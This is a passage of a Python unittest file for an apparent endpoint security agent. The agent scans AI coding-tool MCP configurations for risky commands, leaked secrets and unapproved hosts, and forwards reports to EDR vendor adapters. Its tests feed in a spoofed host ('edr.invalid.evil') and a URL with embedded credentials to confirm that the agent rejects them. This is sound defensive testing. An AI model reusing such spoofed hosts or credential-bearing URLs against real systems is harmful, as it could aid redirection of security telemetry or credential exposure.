        self.assertIn('function Inspect-SentinelMcpToml',script); self.assertIn("$_.Name -eq 'config.toml'",script)
        for finding in ('unknown_mcp','unapproved_mcp_command','broad_filesystem_scope','ambiguous_mcp_transport','unapproved_mcp_transport','unapproved_mcp_domain','mcp_url_credentials','literal_mcp_secret'):
            self.assertIn("kind='"+finding+"'",script[script.index('function Inspect-SentinelMcpToml'):])
        self.assertIn('function Test-SentinelSafeTarget',script); self.assertIn('ReparsePoint',script[script.index('function Test-SentinelSafeTarget'):script.index('function Inspect-SentinelMcpJson')])
    def test_offline_spool(self):
        with tempfile.TemporaryDirectory() as d:
            report={'scanned_at':1,'device_id':'dev'}; path=self.agent.queue_report(Path(d),report)
            self.assertTrue(path.exists()); self.assertEqual(json.loads(path.read_text()),report); self.assertEqual(path.stat().st_mode & 0o777,0o600)
    def test_offline_spool_is_bounded_unique_and_skips_corruption(self):
        with tempfile.TemporaryDirectory() as d:
            spool=Path(d); report={'scanned_at':1,'device_id':'device-123'}
            first=self.agent.queue_report(spool,report,limit=10); second=self.agent.queue_report(spool,report,limit=10)
            self.assertNotEqual(first.name,second.name)
            for index in range(12): self.agent.queue_report(spool,{**report,'scanned_at':index+2},limit=10)
            self.assertEqual(len(list(spool.glob('*.json'))),10)
            corrupt=spool/'000-corrupt.json'; corrupt.write_text('{broken')
            sent=[]
            with patch.object(self.agent,'post_report',side_effect=lambda url,token,value:sent.append(value)):
                count=self.agent.flush_spool(spool,'https://collector.invalid','token')
            self.assertEqual(count,10); self.assertEqual(len(sent),10); self.assertTrue(list(spool.glob('*.invalid')))
    def test_vendor_adapter_is_explicit_and_dry_run(self):
        report={'device_id':'dev-1','policy_version':'3.9.0','scanned_at':1,'summary':{'critical':1},'findings':[{}]}
        config={'allowed_hosts':['invalid'],'sangfor':{'enabled':True,'url':'https://invalid','actions':{'critical':'isolate_pending_approval'}},'leagsoft':{'enabled':True,'url':'https://invalid'}}
        outputs=self.adapter.process(report,config,dry_run=True)
        self.assertEqual(outputs[0]['payload']['recommended_action'],'isolate_pending_approval')
        self.assertFalse(outputs[1]['payload']['compliant'])
    def test_vendor_adapter_rejects_unsafe_actions_and_targets(self):
        report={'device_id':'dev-1','policy_version':'4.2.0','scanned_at':1,'summary':{'critical':1},'findings':[{}]}
        unsafe={'allowed_hosts':['edr.invalid'],'sangfor':{'enabled':True,'url':'https://edr.invalid','actions':{'critical':'isolate'}}}
        spoof={'allowed_hosts':['edr.invalid'],'sangfor':{'enabled':True,'url':'https://edr.invalid.evil','actions':{'critical':'alert'}}}
        insecure={'allowed_hosts':['edr.invalid'],'sangfor':{'enabled':True,'url':'http://edr.invalid','actions':{'critical':'alert'}}}
        embedded={'allowed_hosts':['edr.invalid'],'sangfor':{'enabled':True,'url':'https://user:pass@edr.invalid','actions':{'critical':'alert'}}}
        self.assertEqual(self.adapter.process(report,unsafe,dry_run=True)[0]['error'],'unsafe_sangfor_action:isolate')
        self.assertEqual(self.adapter.process(report,spoof,dry_run=True)[0]['error'],'unapproved_adapter_host:sangfor')
        self.assertEqual(self.adapter.process(report,insecure,dry_run=True)[0]['error'],'invalid_https_url:sangfor')
        self.assertEqual(self.adapter.process(report,embedded,dry_run=True)[0]['error'],'credentials_in_adapter_url:sangfor')
    def test_vendor_failure_isolation_and_offline_retry(self):
        report={'device_id':'dev-1','policy_version':'4.2.0','scanned_at':1,'summary':{'critical':0,'high':1},'findings':[{}]}
        config={'allowed_hosts':['edr.invalid','leag.invalid'],'sangfor':{'enabled':True,'url':'https://edr.invalid/events','token_env':'SANGFOR_TOKEN'},'leagsoft':{'enabled':True,'url':'https://leag.invalid/posture','token_env':'LEAGSOFT_TOKEN'}}
        def sender(url,payload,token='',secret=''):
            if 'edr.invalid' in url: raise OSError('offline')
            return 202
        with tempfile.TemporaryDirectory() as d, patch.dict(os.environ,{'SANGFOR_TOKEN':'s','LEAGSOFT_TOKEN':'l'}):
            outputs=self.adapter.process(report,config,spool_dir=d,sender=sender)
            self.assertEqual([x['result'] for x in outputs],['queued','sent'])
            queued=list(Path(d).glob('*.json')); self.assertEqual(len(queued),1); self.assertEqual(queued[0].stat().st_mode & 0o777,0o600)
            flushed=self.adapter.flush_spool(config,Path(d),sender=lambda url,payload,token='',secret='':204)
            self.assertEqual(flushed[0]['result'],'sent_from_spool'); self.assertFalse(list(Path(d).glob('*.json')))
    def test_vendor_spool_is_bounded_and_corruption_does_not_block(self):
        config={'allowed_hosts':['edr.invalid'],'sangfor':{'enabled':True,'url':'https://edr.invalid/events','token_env':'SANGFOR_TOKEN'}}
        with tempfile.TemporaryDirectory() as d, patch.dict(os.environ,{'SANGFOR_TOKEN':'s'}):
            spool=Path(d)
            for index in range(12): self.adapter.queue_delivery(spool,'sangfor',{'index':index},limit=10)
            self.assertEqual(len(list(spool.glob('*.json'))),10)
            corrupt=spool/'000-corrupt.json'; corrupt.write_text('{broken')
            results=self.adapter.flush_spool(config,spool,sender=lambda url,payload,token='',secret='':202)
            self.assertEqual(results[0]['result'],'quarantined'); self.assertEqual(sum(x['result']=='sent_from_spool' for x in results),10)
            self.assertFalse(list(spool.glob('*.json'))); self.assertTrue(list(spool.glob('*.invalid')))
    def test_auto_enroll_only_git_repositories(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); repo=root/'repo'; other=root/'ordinary'; (repo/'.git').mkdir(parents=True); other.mkdir()
            with patch.object(self.agent,'managed_homes',return_value=[]): changed=self.agent.auto_enroll(root)
            self.assertTrue(changed); self.assertTrue((repo/'.cursor/rules/sentinel-security.mdc').exists()); self.assertFalse((other/'AGENTS.md').exists())
    def test_agent_discovery_uses_markers_without_execution(self):
        with tempfile.TemporaryDirectory() as d:
            home=Path(d); (home/'.codex').mkdir(); (home/'.codex/config.toml').write_text('model="approved"')
            (home/'.claude').mkdir(); (home/'.claude/settings.json').write_text('{}')
            found=self.agent.discover_agent_tools([home],{})
            self.assertEqual({x['name'] for x in found},{'codex','claude_code'})
            self.assertTrue(all(x['detected_by']=='filesystem_marker' for x in found))
    def test_baseline_directory_alone_is_not_an_install_marker(self):
        with tempfile.TemporaryDirectory() as d:
            home=Path(d); (home/'.cursor/rules').mkdir(parents=True)
            self.assertEqual(self.agent.discover_agent_tools([home],{}),[])

if __name__=='__main__': unittest.main()
